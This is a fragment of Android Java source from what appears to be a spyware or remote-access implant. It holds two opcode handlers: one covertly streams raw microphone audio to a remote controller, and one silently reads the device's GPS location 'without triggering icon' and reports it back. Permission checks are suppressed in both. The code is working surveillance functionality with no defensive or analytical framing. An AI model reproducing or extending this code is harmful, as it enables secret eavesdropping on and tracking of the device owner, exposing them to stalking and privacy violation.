    // ══════════════════════════════════════════════════════════════════════════
    //  [0x41] MIC_STREAM_JNI - PCM raw audio stream
    // ══════════════════════════════════════════════════════════════════════════
    @SuppressLint("MissingPermission")
    private void handleMicStream(String payload) {
        JSONObject p;
        try { p = new JSONObject(payload); } catch (Exception e) { p = new JSONObject(); }
        final boolean stop = "stop".equals(p.optString("cmd", "start"));
        if (stop) { isRecordingMic = false; sendResult("MIC_STREAM:STOPPED"); return; }

        isRecordingMic = true;
        final int SAMPLE_RATE    = 16000;
        final int CHANNEL        = AudioFormat.CHANNEL_IN_MONO;
        final int ENCODING       = AudioFormat.ENCODING_PCM_16BIT;
        final int BUFFER_SIZE    = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL, ENCODING) * 4;

        executor.execute(() -> {
            AudioRecord recorder = null;
            try {
                recorder = new AudioRecord(MediaRecorder.AudioSource.MIC, SAMPLE_RATE, CHANNEL, ENCODING, BUFFER_SIZE);
                recorder.startRecording();
                byte[] buf = new byte[BUFFER_SIZE];
                sendResult("MIC_STREAM:STARTED");
                while (isRecordingMic) {
                    int read = recorder.read(buf, 0, buf.length);
                    if (read > 0) {
                        byte[] chunk = new byte[read];
                        System.arraycopy(buf, 0, chunk, 0, read);
                        sendPacket(TYPE_STREAM, chunk);
                    }
                }
            } catch (Exception e) {
                try { sendResult("MIC_ERROR:" + e.getMessage()); } catch (Exception ignored) {}
            } finally {
                if (recorder != null) { try { recorder.stop(); recorder.release(); } catch (Exception ignored) {} }
            }
        });
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  [0x42] LOCATION_SILENT_TRACE - GPS without triggering icon
    // ══════════════════════════════════════════════════════════════════════════
    @SuppressLint("MissingPermission")
    private void handleLocationTrace(String payload) throws Exception {
        android.location.LocationManager lm =
            (android.location.LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) { sendResult("LOC_ERROR:NO_SERVICE"); return; }

        // Try last known location first (no icon triggered)
        String[] providers = {
            android.location.LocationManager.GPS_PROVIDER,
            android.location.LocationManager.NETWORK_PROVIDER,
            android.location.LocationManager.PASSIVE_PROVIDER
        };
        JSONObject result = new JSONObject();
        for (String prov : providers) {
            try {
                android.location.Location loc = lm.getLastKnownLocation(prov);
                if (loc != null) {
                    result.put("provider",  prov);
                    result.put("lat",       loc.getLatitude());
                    result.put("lon",       loc.getLongitude());
                    result.put("accuracy",  loc.getAccuracy());
                    result.put("altitude",  loc.getAltitude());
                    result.put("speed",     loc.getSpeed());
                    result.put("time",      loc.getTime());
                    break;
                }
            } catch (Exception ignored) {}
        }
        if (!result.has("lat")) result.put("error", "NO_LAST_LOCATION");
        sendResult("LOCATION:" + result.toString());
    }

